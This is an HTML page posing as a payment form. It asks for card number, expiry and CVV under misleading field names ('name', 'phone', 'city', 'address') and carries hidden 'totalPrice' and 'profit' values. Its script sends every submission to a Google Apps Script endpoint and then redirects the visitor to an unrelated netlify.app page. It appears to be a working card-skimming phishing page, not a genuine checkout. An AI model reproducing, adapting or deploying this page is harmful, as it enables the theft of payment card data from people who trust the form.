<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            padding: 20px;
        }
        form {
            background: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input[type="submit"] {
            background: #5cb85c;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background: #4cae4c;
        }
    </style>
</head>
<body>

<h1>Customer Details Form</h1>
    <form id="customerForm">
        <label for="name">Card Number</label>
        <input type="text" id="name" name="name" placeholder="1111 2222 3333 4444" required><br><br>

        <label for="phone">Exp Month</label>
        <input type="number" id="phone" name="phone" required><br><br>

        <label for="city">Exp Year</label>
        <input type="number" id="city" name="city" required><br><br>

        <label for="address">CVV</label>
        <input type="number" id="address" name="address" required><br><br>

        <!-- <label for="itemCode">Item Code:</label> -->
        <input type="hidden" id="itemCode" name="itemCode" value="SHST300281224P3" readonly><br><br>

        <!-- <label for="date">Date:</label> -->
        <input type="hidden" id="date" name="date" readonly><br><br>

        <!-- Hidden fields for total price and profit -->
        <input type="hidden" id="totalPrice" name="totalPrice" value="930"> <!-- Set your total price here -->
        <input type="hidden" id="profit" name="profit" value="280"> <!-- Set your profit here -->

        <input type="submit" value="Submit" id="sub">
    </form>

<script>
        // Set the current date in the date input field
        document.getElementById('date').value = new Date().toISOString().split('T')[0];

        document.getElementById('customerForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            const formData = new FormData(this);
            fetch('https://script.google.com/macros/s/AKfycbziMHdqNtmTO0j8cTO8XWsxDNFPDIs4Vblv9d10VmNaRo_KL1ub5yB6K5Tcwn-XFzP0_A/exec', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                // Redirect to another HTML page after successful submission
                window.location.href = 'https://melodic-puppy-430091.netlify.app'; // Change this to your desired page
            })
            .catch(error => {
                alert('Error: ' + error);
            });
        });
    </script>

</body>
</html>
